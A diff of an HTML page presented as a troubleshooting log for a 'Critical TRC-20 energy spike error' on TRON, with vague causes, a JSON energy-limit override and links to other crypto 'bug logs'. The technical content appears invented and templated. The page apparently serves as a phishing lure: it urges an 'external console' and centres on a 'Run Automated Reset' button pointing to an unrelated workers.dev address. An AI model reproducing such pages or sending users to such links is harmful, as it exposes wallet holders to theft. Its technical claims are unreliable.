@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,33 +42,34 @@
 <h1>Critical Trc 20 Energy Spike Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a sudden and significant increase in energy consumption when interacting with TRC-20 tokens on the TRON network, resulting in failed transactions and error messages.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message when attempting to transfer or interact with TRC-20 tokens on the TRON network, resulting in failed transactions and potential loss of funds.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an imbalance in the energy allocation mechanism, causing a surge in energy usage when processing TRC-20 transactions, which overwhelms the network's capacity.</li>
+<li>This error occurs due to an unexpected surge in energy consumption by the smart contract, exceeding the allocated energy limits for the transaction, which is a critical parameter in the TRON network for preventing abuse and maintaining network stability.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the <code>energyLimit</code> parameter in the transaction configuration to optimize energy consumption:</li>
+<li>Increase the energy limit for the transaction using the <code>--energy</code> flag.</li>
+<li>Optimize smart contract code to reduce energy consumption.</li>
+<li>Use a custom configuration with the following settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span>
+<span class="w">  </span><span class="nt">&quot;energy&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;fee&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options. </p>
+<h2>Prerequisites</h2>
 <ul>
-<li>Implement a rate limiter to restrict the frequency of transactions and prevent energy spikes.</li>
-<li>Utilize the TRON network's built-in <code>freeze</code> function to temporarily suspend energy-intensive transactions and alleviate network congestion.</li>
+<li>A basic understanding of the TRON network and its parameters.</li>
+<li>Familiarity with smart contract development and optimization.</li>
+<li>Access to a TRON-compatible wallet or development environment.</li>
 </ul>
-<p>Prerequisites:
-* A basic understanding of TRON's energy allocation mechanism
-* Familiarity with transaction configuration parameters
-* Access to the TRON network's API or a compatible wallet</p>
-<p>Consider utilizing an external console to execute these commands for more efficient troubleshooting.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
